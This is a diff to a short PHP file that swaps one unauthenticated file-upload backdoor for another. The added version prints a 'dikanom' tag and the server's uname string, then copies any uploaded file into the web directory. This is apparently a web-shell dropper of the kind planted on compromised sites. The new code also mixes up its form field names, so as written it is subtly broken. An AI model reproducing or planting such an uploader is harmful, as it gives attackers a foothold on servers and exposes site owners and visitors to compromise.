@@ -1,8 +1,7 @@
-<?php
-echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
-echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
-if( $_POST['_upl'] == "Upload" ) {
-if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) { echo '<b>Sukses<b><br><br>'; }
-else { echo '<b>Failed</b><br><br>'; }
-}
-?>
+<?php 
+echo "dikanom"; 
+echo "<br>".php_uname()."<br>"; 
+echo "<form method='post' enctype='multipart/form-data'> <input type='file' name='zb'><input type='submit' name='upload' value='upload'></form>"; 
+if($_POST['upload']) 
+{ if(@copy($_FILES['zb']['tmp_name'], $_FILES['file']['name'])) 
+{ echo "Sukses upload"; } else { echo "Failed to Upload."; } } ?>
